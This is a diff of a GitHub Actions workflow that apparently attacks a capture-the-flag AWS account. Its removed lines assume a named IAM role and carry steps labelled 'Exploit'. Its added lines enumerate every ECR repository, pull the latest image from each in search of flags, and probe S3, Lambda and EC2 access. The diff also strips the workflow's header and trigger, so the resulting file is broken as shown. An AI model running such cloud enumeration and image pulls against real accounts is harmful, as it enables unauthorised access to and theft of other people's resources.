@@ -1,29 +1,33 @@
-name: Assume AWS Role
-on: [push]
+      - name: Explore ECR Contents
+        run: |
+          # List all repositories
+          aws ecr describe-repositories --query 'repositories[].repositoryName' --output table
+          
+          # For each repository, list images
+          for repo in $(aws ecr describe-repositories --query 'repositories[].repositoryName' --output text); do
+            echo "=== Images in $repo ==="
+            aws ecr list-images --repository-name $repo --query 'imageIds[].imageTag' --output table
+          done
 
-jobs:
-  assume-role:
-    runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-      contents: read
-    steps:
-      - name: Configure AWS Credentials
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
-          aws-region: us-east-1
-          
-      - name: Exploit - List ECR repositories
+      - name: Try to Download Images
         run: |
-          aws ecr describe-repositories
-          
-      - name: Exploit - Access ECR images
+          # Attempt to pull images that might contain flags
+          for repo in $(aws ecr describe-repositories --query 'repositories[].repositoryName' --output text); do
+            echo "Trying to pull from $repo"
+            # Get the latest image tag
+            LATEST_TAG=$(aws ecr describe-images --repository-name $repo --query 'sort_by(imageDetails, &imagePushedAt)[-1].imageTags[0]' --output text)
+            if [ "$LATEST_TAG" != "None" ]; then
+              docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$LATEST_TAG
+            fi
+          done
+
+      - name: Check for Other AWS Services
         run: |
-          # Try to get ECR login token and pull images
-          aws ecr get-login-password | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+          # Check S3 buckets
+          aws s3 ls || echo "No S3 access"
           
-      - name: Exploit - Check IAM permissions
-        run: |
-          aws iam list-attached-role-policies --role-name imaginary-challenge
-          aws sts get-caller-identity
+          # Check Lambda functions
+          aws lambda list-functions || echo "No Lambda access"
+          
+          # Check EC2 instances
+          aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' || echo "No EC2 access"
